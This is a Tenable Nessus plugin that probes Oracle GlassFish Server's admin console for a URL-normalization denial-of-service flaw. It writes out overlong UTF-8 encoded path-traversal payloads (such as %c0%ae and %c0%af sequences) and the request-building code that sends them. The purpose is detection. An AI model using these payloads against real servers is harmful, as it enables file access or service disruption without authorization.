#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(110612);
  script_version("1.3");
  script_cvs_date("Date: 2018/09/17 21:46:52");

  script_xref(name:"TRA", value:"TRA-2018-06");

  script_name(english:"Oracle GlassFish Server URL normalization Denial of Service");
  script_summary(english:"Checks for denial of service in jsftemplating library.");

  script_set_attribute(attribute:"synopsis", value:
"The remote application is vulnerable to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"The instance of Oracle GlassFish Server running on the remote host is
affected by an authenticated and unauthenticated denial of service vulnerability.

The vulnerability is a result of an infinite loop in the normalize() method 
in com.sun.jsftemplating.util.fileStreamer.ResourceContentSource.

A remote attacker can exploit this issue, via a specially crafted HTTP request
to Admin Console component.");
  # https://www.tenable.com/security/research/tra-2018-16
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?81fcff67");
  script_set_attribute(attribute:"solution", value:
"Contact to vendor for patch options.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"An in depth analysis by Tenable researchers revealed the Access Complexity to be high.");


  script_set_attribute(attribute:"vuln_publication_date", value:"2018/06/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/06/19");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:glassfish_server");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("glassfish_console_detect.nasl");
  script_require_keys("www/glassfish", "www/glassfish/console");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("glassfish.inc");

##
# Combine payload string for exploitation of issue
#
# @param [file:string] target file to read from server
# @param [payl:array] contains encoding pattern for '.' and '/'
# @param [depth:int] depth of payloads needed
#
# @return string payload to send to the server
##
function prepare_payload(file, payl, depth)
{
  var i, pieces_of_file;
  var url = '/resource';

  if (empty_or_null(file) || 
    empty_or_null(payl) || empty_or_null(depth))
    audit(AUDIT_FN_FAIL, 'prepare_payload');

  if (depth < 2)
    audit(AUDIT_FN_FAIL, 'prepare_payload');

  # Generate enough encoded /.. sequences 
  for (i=0; i<depth; i++)
    url += payl['/'] + payl['.'] + payl['.'];

  # Encode / in file name
  pieces_of_file = split(file, sep:'/', keep:false);

  for (i=1; i<len(pieces_of_file); i++)
    url += payl['/'] + pieces_of_file[i];

  return url;
}

##
# Select pieces from input parameters to generate payload
#
# @param [file:string] target file to read from server
# @param [payloads:array] contains encoding pattern for '.' and '/'
# @param [depth:int] depth of payloads needed 
#
# @return list of urls that we have to test
##
function gather_pieces(file, payloads, depth)
{
  var payl;
  var urls_list = make_list();

  if (empty_or_null(file) || empty_or_null(payloads) || 
      empty_or_null(depth))
    audit(AUDIT_FN_FAIL, 'gather_pieces');

  if (depth < 2)
    audit(AUDIT_FN_FAIL, 'gather_pieces');

  foreach payl (payloads)
    urls_list[max_index(urls_list)] =
      prepare_payload(file:file, payl:payl, depth:depth);

  return urls_list;
}

#
# Main
#

# Check GlassFish & GlassFish Admin Console
get_kb_item_or_exit('www/glassfish');
get_kb_item_or_exit('www/glassfish/console');

var port = get_glassfish_console_port(default:4848);

# Parameters section
var depth = 10;
var file, res, url;
var vuln, req;
var payloads = [{'.':'%c0%ae', '/':'%c0%af'},
  {'.':'%e0%80%ae', '/':'%c0%af'},
  {'.':'.', '/':'%e0%80%af'},
  {'.':'%f0%80%80%ae', '/':'%e0%80%af'}
];

# Exploitation check
file = '/test/dostest';

foreach url (gather_pieces(file:file, payloads:payloads, depth:depth))
{
  res = get_glassfish_res(url:url, port:port);

  if ('java.lang.IllegalArgumentException: Invalid Resource Path' >< res[2])
  {
    req = build_glassfish_url(url:url, port:port);
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      request     : make_list(req),
      output      : chomp(res[2])
    );
    exit(0);
  }
}

audit(AUDIT_LISTEN_NOT_VULN, "GlassFish Server", port);
exit(0);
